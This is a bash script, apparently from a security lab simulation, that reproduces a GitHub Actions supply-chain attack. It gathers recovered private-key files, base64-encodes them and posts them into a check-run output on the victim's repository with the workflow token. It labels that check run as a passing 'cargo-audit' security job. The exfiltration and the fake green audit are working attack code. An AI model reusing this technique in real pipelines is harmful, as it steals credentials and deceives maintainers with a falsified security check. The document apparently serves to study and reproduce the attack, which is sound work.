#!/usr/bin/env bash
# SIMULATION / LAB ONLY. Exfiltration channel: the token the victim workflow
# passed to this action has checks:write (the real one also had issues:write).
# The attacker stores the recovered key inside a check-run output on the
# victim's own repo, then reads it back out-of-band. No external network.
set -euo pipefail
REPO="${GITHUB_REPOSITORY:?}"
SHA="${GITHUB_SHA:?}"
cd "${GITHUB_WORKSPACE:-.}"

python3 - <<'PY' > /tmp/sim_exfil_payload.json
import base64, glob, json
files = sorted(glob.glob("sim-recovered/cand-*.pem"))
scan = json.load(open("sim-recovered/scan.json")) if glob.glob("sim-recovered/scan.json") else {}
payload = {
    "sim": True,
    "note": "SIMULATION exfil channel: recovered key material inside a check-run output",
    "scan": {k: scan.get(k) for k in ("regions_scanned", "n_unique")},
    "candidates": [
        {"file": f.split("/")[-1], "b64": base64.b64encode(open(f, "rb").read()).decode()}
        for f in files
    ],
}
print(json.dumps(payload))
PY

# strip newlines to keep the payload one JSON string
python3 - <<'PY' > /tmp/sim_check_payload.json
import json
text = open("/tmp/sim_exfil_payload.json").read()
print(json.dumps({
    "name": "security-audit (SIM attacker check)",
    "head_sha": __import__("os").environ["GITHUB_SHA"],
    "status": "completed",
    "conclusion": "success",
    "output": {
        "title": "cargo-audit (SIM)",
        "summary": "SIM: audit passed. (attacker-controlled branch marked the job green)",
        "text": text,
    },
}))
PY

RESP=$(curl -sS -o /tmp/sim_check_resp.json -w '%{http_code}' \
  -X POST \
  -H "Authorization: Bearer ${SIM_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  --data-binary @/tmp/sim_check_payload.json \
  "https://api.github.com/repos/${REPO}/check-runs")
echo "SIM: exfil check-run POST -> HTTP ${RESP}"
[ "${RESP}" = "201" ] || { cat /tmp/sim_check_resp.json; exit 1; }
jq -r '"SIM: exfil stored in check run " + (.id|tostring) + " at " + .html_url' /tmp/sim_check_resp.json